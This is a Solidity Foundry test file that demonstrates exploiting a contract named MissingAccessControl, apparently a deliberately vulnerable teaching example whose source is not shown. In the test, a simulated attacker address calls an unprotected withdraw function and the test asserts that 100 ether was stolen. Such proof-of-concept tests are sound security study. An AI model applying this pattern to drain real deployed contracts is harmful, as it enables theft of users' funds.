// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
// import {Counter} from "../src/Counter.sol";

import "forge-std/Test.sol";
import "../src/MissingAccessControl.sol";

contract MissingAccessControlTest is Test {
    MissingAccessControl public missingAccessControl;
    address public attacker = address(0x1234); // Simulated attacker

    function setUp() public {
        missingAccessControl = new MissingAccessControl();
        vm.deal(address(missingAccessControl), 1000 ether); // Funding the contract
        vm.deal(attacker, 1 ether);                        // Funding the attacker
    }

    function testExploitWithdraw() public {
        // Simulate the attacker calling the withdraw function
        vm.startPrank(attacker); // Simulate actions as the attacker
        uint256 initialBalance = attacker.balance;

        missingAccessControl.withdraw(100 ether); // Exploit the vulnerability

        uint256 finalBalance = attacker.balance;

        // Assert attacker successfully withdrew funds
        assertEq(finalBalance, initialBalance + 100 ether);

        vm.stopPrank();
    }
}
